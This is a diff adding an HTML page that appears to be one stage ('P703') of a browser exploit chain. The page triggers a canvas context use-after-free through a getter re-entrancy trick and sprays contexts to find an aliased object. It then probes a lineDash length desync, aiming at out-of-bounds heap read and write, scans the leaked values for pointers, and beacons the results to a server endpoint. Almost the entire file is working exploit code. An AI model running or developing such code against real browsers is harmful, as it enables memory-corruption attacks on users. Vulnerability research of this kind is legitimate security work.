@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P703 — lineDash length desync → OOB</title>
+<script>
+'use strict';
+/* ============================================================
+ * P703 — characterise the lineDash Vector length desync
+ *
+ * P702 S3 result (single alias, idx=11):
+ *   setLineDash([11.5,22.25,33.125])   (3 elements, via ALIAS)
+ *   INNER.getLineDash() -> len=6, values 11.5,22.25,33.125,...!
+ *
+ * getLineDash through the STALE wrapper reports MORE elements
+ * than were set. Two views of one Vector disagree on m_size.
+ * If that over-read can be extended past the dash buffer end,
+ * getLineDash() becomes an OOB read of adjacent heap as doubles,
+ * and setLineDash() an OOB write => arbitrary R/W with no 768B
+ * pointer forge.
+ *
+ * This probe measures the rule:
+ *   For setLen = 0..8 : report inner.len, alias.len, and the
+ *   values at each index (to see what the extra slots contain).
+ * Then push a large set and read the tail beyond it.
+ * ============================================================ */
+
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P703-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,320))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+function j(a,n){ var o=[]; for(var i=0;i<n&&i<a.length;i++) o.push(a[i]); return o.join(','); }
+
+var INNER=null, SPRAY=[], ALIAS=null, IDX=-1;
+
+function run(){ raw('BOOT','p703'); try{ s0(); }catch(e){ raw('ERR',(e.message||'').slice(0,140)); } }
+
+function s0(){
+  raw('S0-GO','');
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ INNER=cv.getContext('2d'); return true; }});
+  cv.getContext('bitmaprenderer', o);
+  if(!INNER){ raw('S0-FAIL','no-inner'); return; }
+  raw('S0-UAF','ok');
+
+  for(var i=0;i<200;i++){
+    var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+    var sx=sc.getContext('2d');
+    if(sx){ sx.lineWidth=1337.0; SPRAY.push(sx); }
+  }
+  try{ INNER.lineWidth=2468.0; }catch(e){ raw('S0-W-ERR',''); return; }
+  for(var k=0;k<SPRAY.length;k++){
+    try{ if(SPRAY[k].lineWidth===2468.0){ IDX=k; break; } }catch(e){}
+  }
+  raw('S1-ALIAS','idx='+IDX);
+  if(IDX<0) return;
+  ALIAS=SPRAY[IDX];
+  setTimeout(s2, 20);
+}
+
+/* S2 — the length rule, one set per length */
+function s2(){
+  raw('S2-GO','');
+  for(var n=0;n<=8;n++){
+    try{
+      var arr=[];
+      for(var i=0;i<n;i++) arr.push(100+n*10+i);   /* unmistakable values */
+      ALIAS.setLineDash(arr);
+      var gI=INNER.getLineDash();
+      var gA=ALIAS.getLineDash();
+      raw('S2-N'+n,'set='+n+'|inner='+gI.length+'|alias='+gA.length+
+        '|innerVals='+j(gI,12));
+    }catch(e){ raw('S2-N'+n+'ERR',(e.message||'').slice(0,80)); }
+  }
+  setTimeout(s3, 20);
+}
+
+/* S3 — big set, then read far past it through the stale wrapper */
+function s3(){
+  raw('S3-GO','');
+  var N=600;
+  try{
+    var big=[];
+    for(var i=0;i<N;i++) big.push(5000+i);
+    ALIAS.setLineDash(big);
+    var gA=ALIAS.getLineDash();
+    var gI=INNER.getLineDash();
+    raw('S3-LENS','set='+N+'|alias='+gA.length+'|inner='+gI.length);
+
+    /* dump a window well past the declared end */
+    var tail=[];
+    for(var t=N; t<N+40 && t<gI.length; t++) tail.push(gI[t]);
+    raw('S3-TAIL','n='+tail.length+'|vals='+tail.join(',').slice(0,280));
+
+    /* how many are non-integer / pointer-shaped near the end? */
+    var nz=0, ptrshaped=0;
+    for(var z=0;z<gI.length;z++){
+      var b=f64bits(gI[z]);
+      if(b!==BigInt(0)) nz++;
+      if(b>=BigInt('0x1000000000')&&b<BigInt('0x8000000000')) ptrshaped++;
+    }
+    raw('S3-SCAN','len='+gI.length+'|nonzero='+nz+'|ptrShaped='+ptrshaped);
+  }catch(e){ raw('S3-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s4, 20);
+}
+
+/* S4 — try the smallest possible over-read: set 1, expect more */
+function s4(){
+  raw('S4-GO','');
+  try{
+    ALIAS.setLineDash([4321.5]);
+    var gI=INNER.getLineDash();
+    raw('S4-ONE','inner='+gI.length+'|v='+j(gI,10));
+
+    var all=[];
+    for(var i=0;i<gI.length && i<16;i++){
+      all.push('['+i+']'+gI[i]+'('+hex(f64bits(gI[i]))+')');
+    }
+    raw('S4-DUMP',all.join(' ').slice(0,300));
+  }catch(e){ raw('S4-ERR',(e.message||'').slice(0,120)); }
+
+  /* S5: can we WRITE via the over-long view? set through inner after
+   * the alias set a short one, then read back through the alias. */
+  try{
+    ALIAS.setLineDash([1.5,2.5]);
+    var longI=[]; for(var q=0;q<8;q++) longI.push(900+q);
+    INNER.setLineDash(longI);
+    var after=ALIAS.getLineDash();
+    raw('S5-WRITEBACK','aliasLen='+after.length+'|vals='+j(after,10));
+  }catch(e){ raw('S5-ERR',(e.message||'').slice(0,120)); }
+
+  raw('DONE','p703-complete');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P703 — lineDash length desync</pre></body></html>
